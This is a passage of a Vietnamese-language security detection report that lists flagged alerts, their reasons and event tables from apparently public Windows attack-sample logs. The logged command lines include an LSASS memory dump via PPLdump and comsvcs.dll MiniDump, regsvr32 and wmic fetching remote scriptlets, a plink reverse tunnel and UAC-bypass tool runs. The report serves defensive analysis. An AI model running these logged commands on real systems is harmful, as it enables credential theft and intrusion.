- process: sysmon.exe (3), powershell.exe (3), whoami.exe (2), mmc.exe (2); user: IEUser
- file log: Credential Access/babyshark_mimikatz_powershell.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 3 event)
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 2 event)
  - truy cập process lsass (`b_lsass_target`, 2 event) ⚠
  - đọc bộ nhớ process khác (`b_vm_read`, 2 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 16:56:08 | Sysmon 1 | powershell.exe | 1.00 | privilege-escalation | Powershell |
| 16:56:24 | Sysmon 1 | whoami.exe | 1.00 | privilege-escalation | "C:\Windows\system32\whoami.exe"  /user |
| 17:00:09 | Sysmon 1 | whoami.exe | 1.00 | privilege-escalation | "C:\Windows\system32\whoami.exe"  /user |
| 16:55:44 | Sysmon 1 | sysmon.exe | 1.00 | privilege-escalation | sysmon  -c sysmonconfig-18-apr-2019.xml |
| 16:57:04 | Sysmon 1 | mmc.exe | 0.99 | privilege-escalation | "C:\Windows\system32\mmc.exe" "C:\Windows\system32\eventvwr.msc"  |

### A0012 · high · MSEDGEWIN10

- thời gian: 2021-12-07 17:33:01 → 17:33:01 UTC, 11 event, 8 process
- tactic: privilege-escalation (7); credential-access (4)
- process: malseclogon.exe (7), svchost.exe (2), conhost.exe (1), lsass.exe (1); user: IEUser, MSEDGEWIN10$, SYSTEM
- file log: Credential Access/tutto_malseclogon.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 5 event)
  - truy cập process lsass (`b_lsass_target`, 1 event) ⚠
  - đọc bộ nhớ process khác (`b_vm_read`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 17:33:01 | Sysmon 1 | malseclogon.exe | 1.00 | privilege-escalation | MalSeclogon.exe  -p 636 -d 2 |
| 17:33:01 | Security 4688 | malseclogon.exe | 1.00 | privilege-escalation |  |
| 17:33:01 | Security 4703 | malseclogon.exe | 1.00 | credential-access |  |
| 17:33:01 | Security 4688 | malseclogon.exe | 1.00 | credential-access |  |
| 17:33:01 | Sysmon 1 | malseclogon.exe | 1.00 | privilege-escalation | MalSeclogon.exe  -p 636 -d 2 -l 1 |

### A0013 · high · MSEDGEWIN10

- thời gian: 2019-07-27 22:43:41 → 22:43:42 UTC, 10 event, 4 process
- tactic: privilege-escalation (6); persistence (2); lateral-movement (1); defense-evasion (1)
- process: uacbypass.exe (6), winsat.exe (3), consent.exe (1); user: IEUser, SYSTEM
- file log: Privilege Escalation/sysmon_11_7_1_uacbypass_windirectory_mocking.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 6 event)
  - ghi file thực thi / script (`f_drop_exec`, 2 event)
  - mở process với toàn quyền (`b_full_access`, 1 event)
  - đọc bộ nhớ process khác (`b_vm_read`, 1 event)
  - nạp module không ký (`b_unsigned_module`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 22:43:41 | Sysmon 1 | uacbypass.exe | 1.00 | persistence | "C:\Users\IEUser\Downloads\UACBypass.exe"  |
| 22:43:41 | Sysmon 11 | uacbypass.exe | 1.00 | privilege-escalation |  |
| 22:43:41 | Sysmon 11 | uacbypass.exe | 1.00 | privilege-escalation |  |
| 22:43:42 | Sysmon 10 | uacbypass.exe | 1.00 | defense-evasion |  |
| 22:43:41 | Sysmon 11 | uacbypass.exe | 1.00 | lateral-movement |  |

### A0014 · high · MSEDGEWIN10

- thời gian: 2019-08-03 13:50:26 → 13:50:28 UTC, 8 event, 5 process
- tactic: privilege-escalation (7); execution (1)
- process: mmc.exe (2), fubuki.exe (2), uacme.exe (1), explorer.exe (1), consent.exe (1), cmd.exe (1); user: IEUser, SYSTEM
- file log: Privilege Escalation/Sysmon_UACME_38.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 3 event)
  - ghi file thực thi / script (`f_drop_exec`, 1 event)
  - kết nối ra IP public (`b_public_dst`, 1 event)
  - mở process với toàn quyền (`b_full_access`, 1 event)
  - đọc bộ nhớ process khác (`b_vm_read`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 13:50:28 | Sysmon 1 | cmd.exe | 1.00 | privilege-escalation | "C:\Windows\system32\cmd.exe" |
| 13:50:28 | Sysmon 1 | fubuki.exe | 1.00 | privilege-escalation | "C:\Users\IEUser\AppData\Local\Temp\fubuki.exe"  |
| 13:50:26 | Sysmon 1 | uacme.exe | 1.00 | privilege-escalation | UACME.exe  38 |
| 13:50:27 | Sysmon 1 | mmc.exe | 1.00 | privilege-escalation | huy32,wf.msc "C:\Users\IEUser\AppData\Local\Temp\kmkze.msc" |
| 13:50:28 | Sysmon 10 | fubuki.exe | 0.99 | privilege-escalation |  |

### A0015 · high · IEWIN7

- thời gian: 2019-04-29 20:59:14 → 20:59:55 UTC, 7 event, 5 process
- tactic: lateral-movement (3); privilege-escalation (2); discovery (1); persistence (1)
- process: system (2), powershell.exe (2), whoami.exe (1), slui.exe (1); user: IEUser, SYSTEM
- file log: Lateral Movement/lm_sysmon_18_remshell_over_namedpipe.json
- **vì sao báo:**
  - PowerShell chạy ẩn / bỏ qua execution policy (`f_hidden_ps`, 2 event)
  - mở process với toàn quyền (`b_full_access`, 2 event)
  - đọc bộ nhớ process khác (`b_vm_read`, 2 event)
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 20:59:21 | Sysmon 1 | powershell.exe | 1.00 | lateral-movement | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -s -NoLogo -NoProfile |
| 20:59:22 | Sysmon 1 | whoami.exe | 1.00 | lateral-movement | "C:\Windows\system32\whoami.exe"  /all |
| 20:59:22 | Sysmon 10 | powershell.exe | 0.99 | persistence |  |
| 20:59:14 | Sysmon 3 | system | 0.92 | discovery |  |
| 20:59:14 | Sysmon 18 | system | 0.90 | lateral-movement |  |

### A0016 · high · MSEDGEWIN10

- thời gian: 2020-10-15 13:17:02 → 13:17:02 UTC, 7 event, 3 process
- tactic: defense-evasion (5); lateral-movement (2)
- process: tendyron.exe (5), smartscreen.exe (1), iexplore.exe (1); user: IEUser
- file log: AutomatedTestingTools/Malware/sideloading_injection_persistence_run_key.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 5 event)
  - đọc bộ nhớ process khác (`b_vm_read`, 3 event)
  - nạp module không ký (`b_unsigned_module`, 1 event)
  - khoá Run / RunOnce (`k_run`, 1 event)
  - mở process với toàn quyền (`b_full_access`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 13:17:02 | Sysmon 1 | iexplore.exe | 1.00 | lateral-movement | "C:\Program Files (x86)\Internet Explorer\iexplore.exe" |
| 13:17:02 | Sysmon 13 | tendyron.exe | 1.00 | defense-evasion |  |
| 13:17:02 | Sysmon 10 | tendyron.exe | 1.00 | defense-evasion |  |
| 13:17:02 | Sysmon 10 | tendyron.exe | 1.00 | defense-evasion |  |
| 13:17:02 | Sysmon 1 | smartscreen.exe | 0.99 | lateral-movement | C:\Windows\System32\smartscreen.exe -Embedding |

### A0017 · high · IEWIN7

- thời gian: 2019-05-12 00:32:24 → 00:32:40 UTC, 6 event, 6 process
- tactic: privilege-escalation (5); persistence (1)
- process: schtasks.exe (3), python.exe (1), svchost.exe (1), cmd.exe (1); user: IEUser, SYSTEM
- file log: Privilege Escalation/sysmon_1_11_exec_as_system_via_schedtask.json
- **vì sao báo:**
  - file / khoá scheduled task (`k_task_dir`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 00:32:24 | Sysmon 1 | python.exe | 1.00 | persistence | python  winpwnage.py -u elevate -i 4 -p c:\Windows\System32\cmd.exe |
| 00:32:30 | Sysmon 1 | schtasks.exe | 1.00 | privilege-escalation | "C:\Windows\System32\schtasks.exe" /create /xml c:\users\ieuser\appdata\local\temp\elevator.xml /tn  |
| 00:32:35 | Sysmon 1 | schtasks.exe | 1.00 | privilege-escalation | "C:\Windows\System32\schtasks.exe" /run /tn elevator |
| 00:32:40 | Sysmon 1 | schtasks.exe | 1.00 | privilege-escalation | "C:\Windows\System32\schtasks.exe" /delete /tn elevator |
| 00:32:35 | Sysmon 1 | cmd.exe | 0.98 | privilege-escalation | c:\Windows\System32\cmd.exe  |

### A0018 · high · IEWIN7

- thời gian: 2019-05-23 17:26:08 → 17:46:05 UTC, 5 event, 4 process
- tactic: execution (4); defense-evasion (1)
- process: cmd.exe (2), netsh.exe (2), msxsl.exe (1); user: IEUser
- file log: Defense Evasion/de_portforward_netsh_rdp_sysmon_13_1.json, Execution/exec_msxsl_xsl_sysmon_1_7.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 1 event)
  - khoá cấu hình service (`k_services`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 17:26:08 | Sysmon 1 | msxsl.exe | 1.00 | execution | msxsl.exe  c:\Users\IEUser\AppData\Roaming\Adobe\test.dat c:\Users\IEUser\AppData\Roaming\Adobe\test |
| 17:26:09 | Sysmon 1 | cmd.exe | 1.00 | execution | "C:\Windows\System32\cmd.exe"  |
| 17:45:34 | Sysmon 1 | cmd.exe | 1.00 | execution | "C:\Windows\system32\cmd.exe"  |
| 17:46:04 | Sysmon 1 | netsh.exe | 0.99 | defense-evasion | netsh  I p a v l=8001 listena=1.2.3.4 connectp=3389 c=1.2.3.5 |
| 17:46:05 | Sysmon 13 | netsh.exe | 0.99 | execution |  |

### A0019 · high · LAPTOP-JU4M3I0E

- thời gian: 2020-10-27 10:17:18 → 10:17:18 UTC, 4 event, 2 process
- tactic: defense-evasion (2); persistence (1); lateral-movement (1)
- process: processherpaderping.exe (2), samir.exe (2); user: bouss
- file log: Defense Evasion/DE_ProcessHerpaderping_Sysmon_11_10_1_7.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 4 event)
  - ghi file thực thi / script (`f_drop_exec`, 1 event)
  - mở process với toàn quyền (`b_full_access`, 1 event)
  - đọc bộ nhớ process khác (`b_vm_read`, 1 event)
  - nạp module không ký (`b_unsigned_module`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 10:17:18 | Sysmon 11 | processherpaderping.exe | 1.00 | persistence |  |
| 10:17:18 | Sysmon 1 | samir.exe | 1.00 | defense-evasion | ".\samir.exe" |
| 10:17:18 | Sysmon 10 | processherpaderping.exe | 1.00 | defense-evasion |  |
| 10:17:18 | Sysmon 7 | samir.exe | 1.00 | lateral-movement |  |

### A0020 · high · MSEDGEWIN10

- thời gian: 2020-09-09 13:18:23 → 13:18:27 UTC, 3 event, 1 process
- tactic: credential-access (2); lateral-movement (1)
- process: chrome.exe (3); user: IEUser
- file log: Credential Access/CA_4624_4625_LogonType2_LogonProc_chrome.json

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 13:18:23 | Security 4625 | chrome.exe | 1.00 | lateral-movement |  |
| 13:18:27 | Security 4624 | chrome.exe | 1.00 | credential-access |  |
| 13:18:27 | Security 4624 | chrome.exe | 1.00 | credential-access |  |

### A0021 · high · MSEDGEWIN10

- thời gian: 2019-08-28 14:22:27 → 14:22:33 UTC, 110 event, 1 process
- tactic: lateral-movement (65); discovery (45)
- process: 
- file log: Other/rdpcorets_148_mst120_bluekeep_rpdscan_full.json

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 14:22:27 | RdpCoreTS 65 |  | 1.00 | lateral-movement |  |
| 14:22:27 | RdpCoreTS 66 |  | 1.00 | lateral-movement |  |
| 14:22:29 | RdpCoreTS 66 |  | 1.00 | lateral-movement |  |
| 14:22:27 | RdpCoreTS 227 |  | 1.00 | lateral-movement |  |
| 14:22:27 | RdpCoreTS 227 |  | 1.00 | lateral-movement |  |

### A0022 · high · MSEDGEWIN10

- thời gian: 2019-08-28 13:57:47 → 13:58:38 UTC, 105 event, 1 process
- tactic: lateral-movement (64); discovery (41)
- process: 
- file log: Other/rdpcorets_148_mst120_bluekeep_rpdscan_full.json
- **vì sao báo:**
  - đọc kho mật khẩu, cookie, credential (`f_cred_store`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 13:58:34 | RdpCoreTS 65 |  | 1.00 | lateral-movement |  |
| 13:58:36 | RdpCoreTS 66 |  | 1.00 | lateral-movement |  |
| 13:58:35 | RdpCoreTS 65 |  | 1.00 | lateral-movement |  |
| 13:58:37 | RdpCoreTS 227 |  | 1.00 | lateral-movement |  |
| 13:58:35 | RdpCoreTS 227 |  | 1.00 | lateral-movement |  |

### A0023 · high · MSEDGEWIN10

- thời gian: 2019-08-27 17:17:42 → 17:17:57 UTC, 78 event, 1 process
- tactic: lateral-movement (50); discovery (28)
- process: 
- file log: Other/rdpcorets_148_mst120_bluekeep_rpdscan_full.json
- **vì sao báo:**
  - đọc kho mật khẩu, cookie, credential (`f_cred_store`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 17:17:42 | RdpCoreTS 65 |  | 1.00 | lateral-movement |  |
| 17:17:44 | RdpCoreTS 65 |  | 1.00 | lateral-movement |  |
| 17:17:46 | RdpCoreTS 66 |  | 1.00 | lateral-movement |  |
| 17:17:45 | RdpCoreTS 227 |  | 1.00 | lateral-movement |  |
| 17:17:48 | RdpCoreTS 227 |  | 1.00 | lateral-movement |  |

### A0024 · high · MSEDGEWIN10

- thời gian: 2019-08-28 10:02:52 → 10:02:59 UTC, 73 event, 1 process
- tactic: lateral-movement (50); discovery (23)
- process: 
- file log: Other/rdpcorets_148_mst120_bluekeep_rpdscan_full.json
- **vì sao báo:**
  - đọc kho mật khẩu, cookie, credential (`f_cred_store`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 10:02:52 | RdpCoreTS 65 |  | 1.00 | lateral-movement |  |
| 10:02:55 | RdpCoreTS 66 |  | 1.00 | lateral-movement |  |
| 10:02:54 | RdpCoreTS 65 |  | 1.00 | lateral-movement |  |
| 10:02:57 | RdpCoreTS 227 |  | 1.00 | lateral-movement |  |
| 10:02:55 | RdpCoreTS 227 |  | 1.00 | lateral-movement |  |

### A0025 · high · MSEDGEWIN10

- thời gian: 2019-08-28 13:42:28 → 13:42:34 UTC, 73 event, 1 process
- tactic: lateral-movement (50); discovery (23)
- process: 
- file log: Other/rdpcorets_148_mst120_bluekeep_rpdscan_full.json
- **vì sao báo:**
  - đọc kho mật khẩu, cookie, credential (`f_cred_store`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 13:42:28 | RdpCoreTS 65 |  | 1.00 | lateral-movement |  |
| 13:42:32 | RdpCoreTS 66 |  | 1.00 | lateral-movement |  |
| 13:42:31 | RdpCoreTS 65 |  | 1.00 | lateral-movement |  |
| 13:42:34 | RdpCoreTS 227 |  | 1.00 | lateral-movement |  |
| 13:42:32 | RdpCoreTS 227 |  | 1.00 | lateral-movement |  |

### A0026 · high · MSEDGEWIN10

- thời gian: 2019-08-28 14:51:22 → 14:51:36 UTC, 72 event, 1 process
- tactic: lateral-movement (48); discovery (24)
- process: 
- file log: Other/rdpcorets_148_mst120_bluekeep_rpdscan_full.json

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 14:51:22 | RdpCoreTS 65 |  | 1.00 | lateral-movement |  |
| 14:51:27 | RdpCoreTS 66 |  | 1.00 | lateral-movement |  |
| 14:51:27 | RdpCoreTS 227 |  | 1.00 | lateral-movement |  |
| 14:51:29 | RdpCoreTS 227 |  | 1.00 | lateral-movement |  |
| 14:51:29 | RdpCoreTS 227 |  | 1.00 | lateral-movement |  |

### A0027 · high · MSEDGEWIN10

- thời gian: 2019-08-28 14:52:40 → 14:52:55 UTC, 72 event, 1 process
- tactic: lateral-movement (48); discovery (24)
- process: 
- file log: Other/rdpcorets_148_mst120_bluekeep_rpdscan_full.json

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 14:52:40 | RdpCoreTS 65 |  | 1.00 | lateral-movement |  |
| 14:52:45 | RdpCoreTS 66 |  | 1.00 | lateral-movement |  |
| 14:52:45 | RdpCoreTS 227 |  | 1.00 | lateral-movement |  |
| 14:52:47 | RdpCoreTS 227 |  | 1.00 | lateral-movement |  |
| 14:52:47 | RdpCoreTS 227 |  | 1.00 | lateral-movement |  |

### A0028 · high · MSEDGEWIN10

- thời gian: 2019-08-27 17:16:28 → 17:16:34 UTC, 15 event, 1 process
- tactic: lateral-movement (12); discovery (3)
- process: 
- file log: Other/rdpcorets_148_mst120_bluekeep_rpdscan_full.json

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 17:16:28 | RdpCoreTS 65 |  | 1.00 | lateral-movement |  |
| 17:16:28 | RdpCoreTS 131 |  | 1.00 | lateral-movement |  |
| 17:16:34 | RdpCoreTS 148 |  | 1.00 | discovery |  |
| 17:16:34 | RdpCoreTS 148 |  | 1.00 | discovery |  |
| 17:16:34 | RdpCoreTS 148 |  | 0.99 | discovery |  |

### A0029 · high · IEWIN7

- thời gian: 2019-05-26 04:01:42 → 04:01:47 UTC, 11 event, 5 process
- tactic: defense-evasion (9); privilege-escalation (2)
- process: jjs.exe (7), services.exe (2), svchost.exe (1), spoolsv.exe (1); user: IEUser, SYSTEM
- file log: Defense Evasion/apt10_jjs_sideloading_prochollowing_persist_as_service_sysmon_1_7_8_13.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 7 event)
  - nạp module không ký (`b_unsigned_module`, 2 event)
  - khoá cấu hình service (`k_services`, 2 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 04:01:42 | Sysmon 1 | jjs.exe | 1.00 | defense-evasion | "C:\Users\IEUser\Desktop\info.rar\jjs.exe"  |
| 04:01:42 | Sysmon 1 | jjs.exe | 1.00 | defense-evasion | "C:\Users\IEUser\Desktop\info.rar\jjs.exe" |
| 04:01:42 | Sysmon 7 | jjs.exe | 1.00 | defense-evasion |  |
| 04:01:42 | Sysmon 7 | jjs.exe | 1.00 | defense-evasion |  |
| 04:01:43 | Sysmon 8 | jjs.exe | 1.00 | defense-evasion |  |

### A0030 · high · MSEDGEWIN10

- thời gian: 2021-04-22 22:09:25 → 22:09:35 UTC, 11 event, 4 process
- tactic: credential-access (7); defense-evasion (3); privilege-escalation (1)
- process: ppldump.exe (8), services.exe (2), mmc.exe (1); user: IEUser, MSEDGEWIN10$, SYSTEM
- file log: Credential Access/ppl_bypass_ppldump_knowdll_hijack_sysmon_security.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 8 event)
  - dump lsass / SAM / NTDS (`f_cred_dump_file`, 3 event) ⚠
  - truy cập process lsass (`b_lsass_target`, 2 event) ⚠
  - named pipe RPC nhạy cảm (svcctl, samr, lsarpc...) (`f_rpc_pipe`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 22:09:25 | Sysmon 1 | ppldump.exe | 1.00 | credential-access | PPLdump.exe  -v lsass lsass.dmp |
| 22:09:35 | Sysmon 12 | mmc.exe | 1.00 | defense-evasion |  |
| 22:09:26 | Security 4985 | ppldump.exe | 0.99 | defense-evasion |  |
| 22:09:25 | Sysmon 10 | ppldump.exe | 0.99 | credential-access |  |
| 22:09:25 | Sysmon 10 | ppldump.exe | 0.99 | credential-access |  |

### A0031 · high · IEWIN7

- thời gian: 2019-06-20 08:07:42 → 08:07:58 UTC, 9 event, 6 process
- tactic: lateral-movement (5); privilege-escalation (3); execution (1)
- process: cmd.exe (2), netstat.exe (1), powershell.exe (1), whoami.exe (1), systeminfo.exe (1); user: IEUser
- file log: Lateral Movement/powercat_revShell_sysmon_1_3.json
- **vì sao báo:**
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 3 event)
  - mở process với toàn quyền (`b_full_access`, 3 event)
  - đọc bộ nhớ process khác (`b_vm_read`, 3 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 08:07:48 | Sysmon 3 | powershell.exe | 1.00 | lateral-movement |  |
| 08:07:42 | Sysmon 1 | netstat.exe | 1.00 | lateral-movement | "C:\Windows\system32\NETSTAT.EXE"  -na |
| 08:07:52 | Sysmon 1 | whoami.exe | 1.00 | execution | whoami |
| 08:07:48 | Sysmon 1 | cmd.exe | 0.99 | lateral-movement | "cmd" |
| 08:07:48 | Sysmon 1 | cmd.exe | 0.99 | lateral-movement | "cmd" |

### A0032 · high · PC04.example.corp

- thời gian: 2019-04-03 18:11:54 → 18:11:54 UTC, 3 event, 2 process
- tactic: persistence (3)
- process: wmighost.exe (1); user: IEUser
- file log: Persistence/wmighost_sysmon_20_21_1.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 1 event)
  - WMI event subscription (persistence) (`f_wmi_sub`, 1 event) ⚠

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 18:11:54 | Sysmon 1 | wmighost.exe | 1.00 | persistence | "C:\Users\user01\Desktop\WMIGhost.exe"  |
| 18:11:54 | Sysmon 20 |  | 1.00 | persistence |  |
| 18:11:54 | Sysmon 21 |  | 1.00 | persistence |  |

### A0033 · high · IEWIN7

- thời gian: 2019-05-23 16:48:35 → 16:49:08 UTC, 3 event, 3 process
- tactic: execution (2); privilege-escalation (1)
- process: spoolsv.exe (1), wmic.exe (1), cmd.exe (1); user: IEUser
- file log: Execution/exec_wmic_xsl_internet_sysmon_3_1_11.json
- **vì sao báo:**
  - tải file / script từ mạng (`f_download`, 2 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 16:49:08 | Sysmon 1 | cmd.exe | 1.00 | execution | "C:\Windows\System32\cmd.exe"  |
| 16:49:05 | Sysmon 1 | wmic.exe | 1.00 | execution | wmic  process list /format:"https://a.uguu.se/x50IGVBRfr55_test.xsl" |
| 16:48:35 | Sysmon 13 | spoolsv.exe | 0.70 | privilege-escalation |  |

### A0034 · high · IEWIN7

- thời gian: 2019-05-14 01:29:00 → 01:29:04 UTC, 2 event, 1 process
- tactic: defense-evasion (1); execution (1)
- process: mshta.exe (2); user: IEUser
- file log: Lateral Movement/LM_DCOM_MSHTA_LethalHTA_Sysmon_3_1.json

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 01:29:00 | Sysmon 3 | mshta.exe | 1.00 | defense-evasion |  |
| 01:29:04 | Sysmon 1 | mshta.exe | 1.00 | execution | C:\Windows\System32\mshta.exe -Embedding |

### A0035 · high · PC01.example.corp

- thời gian: 2019-02-16 10:01:50 → 10:04:05 UTC, 16 event, 8 process
- tactic: command-and-control (5); discovery (5); privilege-escalation (4); defense-evasion (1); persistence (1)
- process: plink.exe (5), svchost.exe (2), winlogon.exe (2), ui0detect.exe (1), tstheme.exe (1); user: IEUser, NETWORK SERVICE, SYSTEM
- file log: Command and Control/DE_sysmon-3-rdp-tun.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 5 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 10:02:46 | Sysmon 3 | plink.exe | 1.00 | command-and-control |  |
| 10:04:04 | Sysmon 3 | plink.exe | 1.00 | command-and-control |  |
| 10:02:21 | Sysmon 1 | plink.exe | 1.00 | defense-evasion | plink.exe  10.0.2.18 -P 80 -C -R 127.0.0.3:4444:127.0.0.2:3389 -l test -pw test |
| 10:02:21 | Sysmon 3 | plink.exe | 1.00 | command-and-control |  |
| 10:01:50 | Sysmon 5 | plink.exe | 0.97 | privilege-escalation |  |

### A0036 · high · LAPTOP-JU4M3I0E

- thời gian: 2021-08-22 19:33:37 → 19:33:38 UTC, 7 event, 3 process
- tactic: privilege-escalation (5); discovery (1); persistence (1)
- process: efspotato.exe (3), system (3), whoami.exe (1); user: NETWORK SERVICE, SYSTEM
- file log: Privilege Escalation/EfsPotato_sysmon_17_18_privesc_seimpersonate_to_system.json
- **vì sao báo:**
  - chạy từ thư mục người dùng ghi được (temp, profile, programdata) (`b_user_writable`, 3 event)
  - named pipe RPC nhạy cảm (svcctl, samr, lsarpc...) (`f_rpc_pipe`, 3 event)
  - lệnh khám phá hệ thống / domain (`f_discovery_cmd`, 2 event)
  - dump lsass / SAM / NTDS (`f_cred_dump_file`, 1 event) ⚠

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 19:33:38 | Sysmon 17 | efspotato.exe | 1.00 | privilege-escalation |  |
| 19:33:37 | Sysmon 1 | efspotato.exe | 1.00 | privilege-escalation | c:\temp\EfsPotato.exe  whoami |
| 19:33:38 | Sysmon 5 | efspotato.exe | 0.99 | privilege-escalation |  |
| 19:33:38 | Sysmon 1 | whoami.exe | 0.88 | persistence | whoami |
| 19:33:38 | Sysmon 18 | system | 0.88 | discovery |  |

### A0037 · high · LAPTOP-JU4M3I0E

- thời gian: 2021-01-26 13:21:13 → 13:21:33 UTC, 6 event, 5 process
- tactic: execution (5); persistence (1)
- process: msbuild.exe (2), cmd.exe (1), powershell.exe (1), notepad.exe (1), mmc.exe (1); user: bouss
- file log: Execution/execution_evasion_visual_studio_prebuild_event.json
- **vì sao báo:**
  - ghi file thực thi / script (`f_drop_exec`, 2 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 13:21:14 | Sysmon 1 | powershell.exe | 1.00 | execution | powershell.exe   start-process notepad.exe |
| 13:21:13 | Sysmon 1 | cmd.exe | 0.97 | execution | "C:\windows\system32\cmd.exe"  /Q /D /C C:\Users\bouss\AppData\Local\Temp\tmpf890f11830e143ada2d718f |
| 13:21:14 | Sysmon 1 | notepad.exe | 0.94 | execution | "C:\windows\system32\notepad.exe"  |
| 13:21:13 | Sysmon 11 | msbuild.exe | 0.87 | execution |  |
| 13:21:13 | Sysmon 11 | msbuild.exe | 0.87 | execution |  |

### A0038 · high · IEWIN7

- thời gian: 2019-05-13 18:02:47 → 18:03:20 UTC, 5 event, 4 process
- tactic: persistence (3); execution (2)
- process: regsvr32.exe (2), mobsync.exe (1), cmd.exe (1), notepad.exe (1); user: IEUser
- file log: Persistence/sysmon_1_persist_bitsjob_SetNotifyCmdLine.json
- **vì sao báo:**
  - tải file / script từ mạng (`f_download`, 1 event)
  - chạy script qua javascript:/vbscript:/scriptlet (`f_script_proto`, 1 event)
  - kết nối ra IP public (`b_public_dst`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 18:03:19 | Sysmon 1 | cmd.exe | 1.00 | persistence | /c notepad.exe |
| 18:03:19 | Sysmon 1 | regsvr32.exe | 1.00 | execution | /u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll |
| 18:03:19 | Sysmon 1 | notepad.exe | 0.99 | persistence | notepad.exe |
| 18:03:20 | Sysmon 3 | regsvr32.exe | 0.76 | execution |  |
| 18:02:47 | Sysmon 1 | mobsync.exe | 0.54 | persistence | C:\Windows\System32\mobsync.exe -Embedding |

### A0039 · high · MSEDGEWIN10

- thời gian: 2019-08-30 12:54:07 → 12:54:08 UTC, 4 event, 2 process
- tactic: privilege-escalation (1); credential-access (1); persistence (1); defense-evasion (1)
- process: rundll32.exe (3), cscript.exe (1); user: IEUser
- file log: Credential Access/sysmon_10_1_memdump_comsvcs_minidump.json
- **vì sao báo:**
  - dump lsass / SAM / NTDS (`f_cred_dump_file`, 1 event) ⚠
  - process con của dịch vụ thực thi từ xa (wsmprovhost, wmiprvse, DCOM) (`b_child_of_remote`, 1 event)
  - mở process với toàn quyền (`b_full_access`, 1 event)
  - đọc bộ nhớ process khác (`b_vm_read`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 12:54:08 | Sysmon 1 | rundll32.exe | 1.00 | credential-access | rundll32 C:\windows\system32\comsvcs.dll, MiniDump 4868 C:\Windows\System32\notepad.bin full |
| 12:54:07 | Sysmon 1 | cscript.exe | 1.00 | privilege-escalation | cscript  c:\ProgramData\memdump.vbs notepad.exe |
| 12:54:08 | Sysmon 11 | rundll32.exe | 0.97 | persistence |  |
| 12:54:08 | Sysmon 10 | rundll32.exe | 0.88 | defense-evasion |  |

### A0040 · high · MSEDGEWIN10

- thời gian: 2020-04-25 22:18:47 → 22:20:21 UTC, 6 event, 6 process
- tactic: privilege-escalation (4); execution (1); lateral-movement (1)
- process: consent.exe (2), cmd.exe (1), program.exe (1), rundll32.exe (1), regedit.exe (1); user: IEUser, SYSTEM
- file log: Privilege Escalation/privesc_unquoted_svc_sysmon_1_11.json
- **vì sao báo:**
  - ghi file thực thi / script (`f_drop_exec`, 1 event)
  - binary bị đổi tên (`b_renamed`, 1 event)

| Thời gian | Event | Process | p | Tactic | Command line |
|---|---|---|---|---|---|
| 22:18:47 | Sysmon 11 | cmd.exe | 1.00 | privilege-escalation |  |
| 22:19:18 | Sysmon 1 | program.exe | 0.76 | privilege-escalation | c:\Program Files\vulnsvc\mmm.exe |
